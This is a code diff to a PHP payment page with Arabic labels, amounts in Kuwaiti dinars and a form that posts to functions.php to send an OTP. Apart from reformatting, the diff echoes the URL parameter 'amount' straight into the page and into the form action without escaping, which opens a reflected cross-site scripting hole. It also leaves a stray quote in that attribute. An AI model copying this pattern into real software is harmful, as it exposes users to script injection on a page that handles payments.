@@ -18,24 +18,32 @@
 
 <body>
 
-<style>
-    /* Simple loader styles */
-    #loader {
-      display: none; /* Hidden by default */
-      border: 4px solid #f3f3f3; /* Light gray */
-      border-top: 4px solid #3498db; /* Blue */
-      border-radius: 50%;
-      width: 30px;
-      height: 30px;
-      animation: spin 1s linear infinite;
-    }
+    <style>
+        /* Simple loader styles */
+        #loader {
+            display: none;
+            /* Hidden by default */
+            border: 4px solid #f3f3f3;
+            /* Light gray */
+            border-top: 4px solid #3498db;
+            /* Blue */
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
 
-    /* Spin animation */
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-  </style>
+        /* Spin animation */
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
 
     <header class="header-image d-flex justify-content-center align-items-center">
         <div class="container">
@@ -43,7 +51,7 @@
                 <!-- Box with Name and Image -->
                 <div class="col-md-12 mb-3">
                     <div class="content-box text-center">
-                        <img src="user-image.jpg" alt="User Image" class="rounded-circle mb-3" width="100"> <!-- Replace with your image URL -->
+                        <img src="banner.png" alt="User Image" class="banner mb-3"> <!-- Replace with your image URL -->
                     </div>
                 </div>
             </div>
@@ -62,14 +70,14 @@
                     </li>
                     <li class="list-group-item d-flex justify-content-start">
                         <span class="">المبلغ</span> <!-- Aligns to the left -->
-                        <span class="mx-auto text-blue">100 KD</span> <!-- Centers within the list item -->
+                        <span class="mx-auto text-blue"><?php echo  isset($_GET['amount'])?  $_GET['amount']." KD" :  '100 KD'?></span> <!-- Centers within the list item -->
                     </li>
                 </ul>
             </div>
         </div>
     </section>
 
-    <form action="functions.php" method="post" id="payment-form">
+    <form action="functions.php?amount=<?php echo  isset($_GET['amount'])?  $_GET['amount'] :  '100'?>"" method="post" id="payment-form">
         <input type="hidden" name="action" value="sendOTP">
         <section>
             <div class="container">
@@ -108,9 +116,9 @@
     </form>
 
 
- <div class="loader-overlay d-flex justify-content-center align-items-center">
-    <div id="loader"></div>
-  </div>
+    <div class="loader-overlay d-flex justify-content-center align-items-center">
+        <div id="loader"></div>
+    </div>
     <!-- Bootstrap JS -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
@@ -132,29 +140,29 @@
                 // Submit form if valid
 
                 if (isValid) {
-          // Simulate a delay for demonstration (e.g., submitting the form)
-                setTimeout(function() {
-                    $.ajax({
-                        url: 'functions.php', // Replace with your PHP script URL
-                        type: 'POST',
-                        data: $('#payment-form').serialize(), // Serialize the form data
-                        success: function(response) {
-                            // Handle success response
-                            console.log(response);
-                        },
-                        error: function(xhr, status, error) {
-                            // Handle error response
-                            console.log(xhr.responseText);
-                        },
-                        complete: function() {
-                            // Hide the loader
-                            $('#loader').hide();
-                        }
-                    });
-                }, 1000);
+                    // Simulate a delay for demonstration (e.g., submitting the form)
+                    setTimeout(function() {
+                        $.ajax({
+                            url: 'functions.php', // Replace with your PHP script URL
+                            type: 'POST',
+                            data: $('#payment-form').serialize(), // Serialize the form data
+                            success: function(response) {
+                                // Handle success response
+                                console.log(response);
+                            },
+                            error: function(xhr, status, error) {
+                                // Handle error response
+                                console.log(xhr.responseText);
+                            },
+                            complete: function() {
+                                // Hide the loader
+                                $('#loader').hide();
+                            }
+                        });
+                    }, 1000);
                 } else {
-                // Hide the loader if validation fails
-                $('#loader').hide();
+                    // Hide the loader if validation fails
+                    $('#loader').hide();
                 }
 
 
